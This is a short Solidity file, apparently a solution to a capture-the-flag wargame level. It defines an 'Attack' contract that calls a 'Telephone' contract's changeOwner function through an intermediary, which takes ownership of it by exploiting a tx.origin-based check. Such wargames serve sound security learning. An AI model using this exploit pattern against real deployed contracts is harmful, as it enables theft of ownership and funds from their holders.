// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import "./Telephone.sol";

contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone){
        telephone = _telephone;
    }

    function steelOwnership() external {
        telephone.changeOwner(msg.sender);
    }
}